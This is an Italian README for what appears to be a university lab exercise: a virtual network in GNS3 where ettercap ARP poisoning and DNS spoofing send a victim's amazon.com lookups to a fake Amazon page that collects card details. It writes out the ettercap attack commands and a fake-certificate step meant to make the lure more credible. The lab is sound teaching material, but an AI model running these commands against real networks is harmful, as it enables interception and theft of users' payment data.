# Phishing w/ DNS Spoofing & ARP Poisoning

Il phishing è un attacco che mira ad esporre i dati privati dell'utente. In questo esempio di attacco, i target sono le informazioni della carta di credito di un utente inesperto attraverso un reindirizzamento su un falso sito di amazon che richiede di autenticarsi per continuare a navigare.

## ARP Poisoning

A livello Datalink, l'attacco è reso possibile grazie ad un poisoning delle tabelle ARP della vittima e del gateway, mettendosi in mezzo alle comunicazioni dei due. Ciò è reso possibile dall'assenza di controllo e di affidabilità sui messaggi ARP che viaggiano sulla rete, permettendo all'attaccante di spacciarsi per chi in realtà non è.

## DNS Spoofing

A livello applicativo, una volta messi in mezzo alle comunicazioni, l'attacco è completato rilevando eventuali richieste di risoluzione del dominio target (amazon.com) della vittima, e modificando le risposte ricevute dal server DNS, reindirizzando l'utente ad un indirizzo IP diverso da quello associato al vero Web Server. Anche in questo caso, la mancanza di controlli di integrità sui messaggi DNS lascia piede libero all'attaccante, che può modificare a suo piacimento il messaggio di risposta.

# Environment Setup

## Macchine Virtuali

Per riprodurre l'attacco, sono necessarie 4 macchine virtuali:

- Alpine Linux 3.20.0 (DNS Server)    192.168.160.5
- Alpine Linux 3.20.0 (Web Server)    192.168.161.5
- Kali Linux 2024-2 (Victim)          192.168.162.2
- Kali Linux 2024-2 (Attacker)        192.168.162.3

## Routers

Per configurare i router, utilizziamo un template container Docker. Su GNS3, navigare in "Edit/Preferences", "New" e selezionare "Run this Docker container on the GNS3 VM", per poi "Next". Creare un nuovo template con "New image" e scrivere "Frrouting/frr:latest" nell'area testo "Image name", per poi cliccare su "Next". Specificare 3 come numero di interfacce e andare su "Next" 3 volte, per poi terminare su "Finish".

Una volta organizzati i componenti come nella rete mostrata in "Network/NetworkConf.png", configurare i router secondo quanto indicato nei file di configurazione associati. Configurare le macchine virtuali con gli indirizzi IP statici indicati sopra, ricordandosi di specificare per la vittima e per l'attaccante l'indirizzo IP del Server DNS che abbiamo creato.

## Server DNS

Per prima cosa, installare il package Bind per gestire il Server DNS:

~~~console
$ sudo apk add bind
~~~

e copiare i file nella cartella "DNS Server" nella directory

~~~console
/etc/bind
~~~

## Web Server

Per gestire il Web Server, installare il package Apache2:

~~~console
$ sudo apk add apache2
~~~

e copiare il file "index.html" dalla directory "Web Server" nella directory

~~~console
/var/www/localhost/htdocs
~~~

Per simulare una situazione reale, creiamo un certificato che simuli il certificato reale di amazon.com:

~~~console
$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key -out /etc/ssl/certs/apache-selfsigned.crt
~~~

inserendo le informazioni richieste. Inserire, infine, il file di configurazione "httpd.conf" dalla directory "Web Server" nella directory

~~~console
/etc/apache2
~~~

per abilitare l'uso del certificato.

## Attacker

Per configurare l'attaccante, inseriamo il contenuto di "Attacker/Docs" nella directory

~~~console
/var/www/html
~~~

e creiamo un falso certificato che emula quello creato in precedenza per far sembrare l'attacco di phishing più credibile:

~~~console
$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key -out /etc/ssl/certs/apache-selfsigned.crt
~~~

Inseriamo, poi, il file "default-ssl.conf" dalla directory "Attacker" nella directory

~~~console
/etc/apache2/sites-available
~~~

e completiamo il setup inserendo "etter.dns" dalla directory "Attacker" nella directory

~~~console
/etc/ettercap
~~~

# Realizzazione Attacco

Per attivare l'attacco, accediamo al terminale dell'attaccante ed eseguiamo il comando

~~~console
$ sudo ettercap -T -q -i eth0 -M arp:remote -S /192.168.162.1// /192.168.162.2//
~~~

per attivare l'ARP Poisoning. Infine, attiviamo il DNS Spoofing basato sulle configurazioni che abbiamo inserito con il comando

~~~console
$ sudo ettercap -T -q -i eth0 -P dns_spoof
~~~

Noteremo che da un qualsiasi browser, in caso di ricerca di "amazon.com", la vittima sarà automaticamente reindirizzata al sito web che abbiamo creato sulla macchina dell'attaccante.
